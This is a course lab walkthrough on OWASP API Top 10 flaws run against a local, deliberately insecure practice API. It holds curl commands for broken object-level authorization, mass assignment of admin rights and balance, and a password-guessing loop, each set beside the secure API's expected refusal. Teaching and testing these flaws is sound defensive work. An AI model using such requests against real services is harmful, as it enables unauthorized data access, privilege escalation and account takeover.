# Week 10 — API Security: Attack Walkthrough

Start both APIs from the lab folder (it keeps running; use a second terminal for the rest):

```bash
cd ~/software-security/labs/week10-api-security
docker compose up --no-build --pull never
```

The **insecure** API is on port 8080 and the **secure** API is on port 8081. Seeded users: `alice` (id 1), `bob` (id 2), `carol` (id 3, admin, balance 9999).

---

## API1:2023 — Broken Object Level Authorization (BOLA)

The insecure API never checks who is asking. Read carol's (admin) and bob's orders as nobody, just by changing the id:

```bash
curl http://localhost:8080/api/users/3/orders
curl http://localhost:8080/api/users/2/orders
```

On the **secure** API the same request is refused unless you own the object. Expected results, in order: `401` (no identity), `403` (alice, id 1, may not read carol's orders), `200` (alice reads her own):

```bash
curl -i http://localhost:8081/api/users/3/orders
curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/3/orders
curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/1/orders
```

---

## API3:2023 — Mass Assignment (Broken Object Property Level Authorization)

Sneak in fields the client should never control. On the insecure API the response shows `"is_admin": true` and `"balance": 1000000`:

```bash
curl -X POST http://localhost:8080/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'
```

On the **secure** API only the allow-listed fields are kept, and the server sets the rest. The response shows `"is_admin": false` and `"balance": 0`:

```bash
curl -X POST http://localhost:8081/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'
```

---

## API4:2023 — Unrestricted Resource Consumption (no rate limit)

Guess alice's password on the insecure API. Every guess is processed, with no slowdown:

```bash
for pw in wrong1 wrong2 wrong3 alice123; do curl -s -X POST http://localhost:8080/api/login -H "Content-Type: application/json" -d "{\"username\":\"alice\",\"password\":\"$pw\"}"; echo; done
```

On the **secure** API the 6th attempt within 60 seconds returns `429 Too Many Requests`. Expected output, one per line: `401` five times, then `429` twice (if every line is `429`, wait 60 seconds and try again):

```bash
for i in $(seq 1 7); do curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8081/api/login -H "Content-Type: application/json" -d '{"username":"alice","password":"wrong"}'; done
```

---

## Deliverable

Map each finding to its OWASP API id, show the exploit command and result, then point to the fix in `solution_api.py` that stops it.
